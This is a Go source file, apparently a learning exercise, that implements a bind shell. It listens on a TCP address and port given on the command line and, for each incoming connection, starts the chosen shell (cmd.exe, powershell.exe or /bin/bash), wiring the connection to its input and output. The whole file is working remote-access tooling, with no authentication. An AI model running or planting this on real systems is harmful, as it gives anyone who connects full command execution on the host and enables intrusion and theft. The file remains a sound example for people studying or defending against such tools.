package main

import (
	"fmt"
	"log"
	"os"
	"os/exec"
	"net"
	"bufio"
	"io"
)

// Flusher defines a type to wrap an io.Writer
// with an bufio.Writer for flushing
type Flusher struct {
	w *bufio.Writer
}

// Write attempts to write and flush bytes
// into the underlying bufio.Writer
func (f *Flusher) Write(b []byte) (int, error) {
	// attempt to write
	count, err := f.w.Write(b)	
	if err != nil {
		return -1, err
	}
	// attempt to flush
	if err := f.w.Flush(); err != nil {
		return -1, err
	}
	return count, err
}

// NewFlusher creates takes an io.Writer and
// and wraps it with bufio.Writer to create a 
// Flusher
func NewFlusher(w io.Writer) *Flusher {
	return &Flusher {
		w: bufio.NewWriter(w),
	}
}

// func handler(conn) {
// 	cmd := exec.Command("powershell.exe", "-c", "Write-Host", "'hello'")

// 	// fine for Linux, not Windows
// 	//cmd.Stdin  = conn
// 	//cmd.Stdout = conn

// 	// for Windows
// 	cmd.Stdin  = conn
// 	cmd.Stdout = NewFlusher(conn)

// 	if err := cmd.Run(); err != nil {
// 		log.Fatalln("[X] (Handle) unable to run command")
// 	}
// }

func handler(conn net.Conn, shell string) {
 	cmd := exec.Command(shell)
 	// Creating synchronous, in-memory pipe 
 	rp, wp := io.Pipe()
 	// Setting Stdin to conn's io.Reader
 	cmd.Stdin = conn
 	// Setting Stdout to wp (PipeWriter), for synchronous piping
 	cmd.Stdout = wp
 	// Writing data from the PipeReader into the TCP connection
 	go io.Copy(conn, rp)
 	// Run command
 	cmd.Run()
 	// Close connection
 	conn.Close()
}

func main() {
	if len(os.Args) < 4 {
		fmt.Println("[!] Usage: client.go <ip> <port> <cmd.exe|powershell.exe|/bin/bash")
		os.Exit(1)
	}

	addr, port, shell := os.Args[1], os.Args[2], os.Args[3]
	listenOn := fmt.Sprintf("%s:%s", addr, port)

	listener, err := net.Listen("tcp", listenOn)
	if err != nil {
		log.Fatalf("[X] (main) Unable to listen on: %s", listenOn)
	}
	log.Printf("Listening on %s", listenOn)

	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Fatalln("[X] (main) unable to receive connection from client")	
		}
		go handler(conn, shell)
	}	


}
